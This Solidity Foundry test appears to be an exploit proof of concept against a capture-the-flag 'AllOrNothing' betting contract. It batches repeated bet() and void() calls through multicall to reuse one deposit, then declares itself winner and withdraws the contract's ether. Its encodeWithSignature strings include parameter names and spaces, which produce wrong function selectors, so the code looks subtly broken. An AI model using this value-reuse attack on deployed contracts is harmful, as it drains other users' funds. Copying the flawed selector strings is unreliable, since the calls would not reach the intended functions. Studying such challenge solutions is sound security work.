// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "../src/AllorNothing/src/AllOrNothing.sol";
import "../src/AllorNothing/src/Multicall.sol";

contract test is Test {
    AllOrNothing public target;
    address user = 0x31Db4Eedf8FC1f06C8fBDb384b38B29B093F7A12;

    function setUp() public {
        target = new AllOrNothing(1 ether, 10);
        vm.startPrank(user);
        vm.deal(user, 1 ether);
        vm.deal(address(target), 5 ether);
    }

    function test_first() public {
        bytes[] memory data = new bytes[](5);
        data[0] = abi.encodeWithSignature("bet(uint256 number, address recipient)", 123456, address(this));
        data[1] = abi.encodeWithSignature("void()");
        data[2] = abi.encodeWithSignature("bet(uint256 number, address recipient)", 123456, address(this));
        data[3] = abi.encodeWithSignature("void()");
        data[4] = abi.encodeWithSignature("bet(uint256 number, address recipient)", 123456, address(this));
        target.multicall(data);
        vm.stopPrank();
        
        vm.warp(block.timestamp + 60);
        target.publish(1029384756);
        
        vm.startPrank(user);
        target.declareWinner(user);

        vm.warp(block.timestamp + 1 days);
        target.withdrawWinnings();
    }
}